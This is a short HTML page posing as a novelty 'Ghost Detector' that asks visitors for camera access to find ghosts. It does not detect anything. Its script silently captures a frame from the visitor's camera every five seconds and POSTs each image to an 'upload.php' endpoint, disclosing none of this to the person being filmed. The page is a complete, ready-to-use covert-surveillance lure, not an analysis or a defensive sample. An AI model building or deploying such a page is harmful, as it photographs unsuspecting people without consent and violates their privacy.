<!DOCTYPE html>
<html>
<head>
  <title>Ghost Detector</title>
  <style>
body{
  background-image: url("/background/ghost.jpeg"), url("/background/ghost2.jpeg");
  background-color: #900C3F;
    } 
    h1, p {
      text-align: center;
    }
    h1 {
      margin-top: 20px;
      font-size: 2.5em;
      color: #ff0000; /* Scary red color */
    }
    p {
      font-size: 1.2em;
    }
    #camera-view {
      width: 100%;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
    }
    #video {
      border: 5px solid #000; /* Black border for contrast */
    }
  </style>
</head>
<body>
  <h1>Ghost Detector</h1>
  <p>Allow access to your camera to detect ghosts!</p>
  <div id="camera-view">
    <video id="video" width="640" height="480" autoplay></video>
  </div>
  <script>
    // Access the camera
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        document.getElementById('video').srcObject = stream;
      })
      .catch(error => {
        console.error('Error accessing camera:', error);
      });

    // Function to capture photo and send it to the server
    function capturePhoto() {
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');
      const video = document.getElementById('video');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataURL = canvas.toDataURL('image/png');
      console.log('Capturing photo...'); // Debug log
      console.log('Data URL:', dataURL); // Debug log

      fetch('upload.php', {
        method: 'POST',
        body: JSON.stringify({ image: dataURL }),
        headers: {
          'Content-Type': 'application/json'
        }
      }).then(response => response.text())
        .then(result => console.log('Upload result:', result))
        .catch(error => console.error('Upload error:', error));
    }

    // Capture photo every 5 seconds
    setInterval(capturePhoto, 5000);
  </script>
</body>
</html>
